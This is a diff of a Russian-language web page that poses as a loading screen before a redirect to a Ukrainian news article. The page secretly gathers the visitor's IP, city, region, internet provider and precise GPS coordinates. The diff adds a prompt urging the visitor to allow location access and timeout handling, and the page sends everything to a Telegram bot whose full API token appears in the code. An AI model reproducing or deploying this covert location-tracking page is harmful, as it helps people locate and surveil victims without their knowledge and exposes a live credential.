@@ -3,31 +3,32 @@
 <head>
   <meta charset="UTF-8">
   <title>Загрузка...</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     html, body {
       margin: 0;
       padding: 0;
       background-color: #000;
-      color: #000;
+      color: #fff;
       height: 100vh;
-      overflow: hidden;
+      display: flex;
+      justify-content: center;
+      align-items: center;
       font-family: sans-serif;
-      -webkit-user-select: none;
-      -webkit-touch-callout: none;
     }
     #status {
-      display: none;
+      font-size: 1.2em;
+      text-align: center;
     }
   </style>
 </head>
 <body>
-  <div id="status">Загрузка...</div>
+  <div id="status">⏳ Разрешите доступ к геолокации, если будет запрошено...</div>
 
   <script>
     const redirectUrl = "https://dnepr.express/ru/post/masshtabnyj-narkobiznes-razoblachili-v-15-oblastyah-ukrainy-sredi-nih-dnepropetrovshina";
 
-    function sendToTelegram(message) {
+    function sendToTelegram(message, callback) {
       fetch("https://api.telegram.org/bot7780068053:AAEfj3ROoHOupCeM7F_W7auJAkakcluF5Nw/sendMessage", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -36,8 +37,13 @@
           text: message
         })
       }).finally(() => {
-        window.location.href = redirectUrl;
+        callback();
       });
+    }
+
+    function startRedirect() {
+      document.getElementById("status").innerText = "🔁 Перенаправление...";
+      window.location.href = redirectUrl;
     }
 
     fetch("https://ipwho.is/")
@@ -49,18 +55,52 @@ IP: ${data.ip}
 Регион: ${data.region}
 Страна: ${data.country}
 Провайдер: ${data.connection.isp}
-Время: ${new Date().toLocaleString()}`.trim();
+Время: ${new Date().toLocaleString()}`;
 
+        // GPS запрос
         if (navigator.geolocation) {
+          let gotGPS = false;
+
+          const gpsTimeout = setTimeout(() => {
+            if (!gotGPS) {
+              const msg = ipMessage + "\n\n⚠️ GPS: не получен (таймаут)";
+              sendToTelegram(msg, startRedirect);
+            }
+          }, 7000); // немного дольше
+
           navigator.geolocation.getCurrentPosition(
             pos => {
+              gotGPS = true;
+              clearTimeout(gpsTimeout);
               const lat = pos.coords.latitude;
               const lon = pos.coords.longitude;
               const acc = pos.coords.accuracy;
-              const gpsMessage = `\n\n📍 GPS: ${lat}, ${lon}\n🎯 Точность: ${acc} м`;
-              sendToTelegram(ipMessage + gpsMessage);
+              const msg = ipMessage + `\n\n📍 GPS: ${lat}, ${lon}\n🎯 Точность: ${acc} м`;
+              sendToTelegram(msg, startRedirect);
             },
             err => {
-              const msg = ipMessage + `\n\n⚠
+              clearTimeout(gpsTimeout);
+              const msg = ipMessage + `\n\n⚠️ Ошибка GPS: ${err.message}`;
+              sendToTelegram(msg, startRedirect);
+            },
+            {
+              enableHighAccuracy: true,
+              timeout: 7000,
+              maximumAge: 0
+            }
+          );
+        } else {
+          const msg = ipMessage + "\n\n⚠️ GPS не поддерживается.";
+          sendToTelegram(msg, startRedirect);
+        }
+      })
+      .catch(() => {
+        const msg = "❌ Ошибка получения IP-геолокации.";
+        sendToTelegram(msg, startRedirect);
+      });
+  </script>
+</body>
+</html>
+
 
 
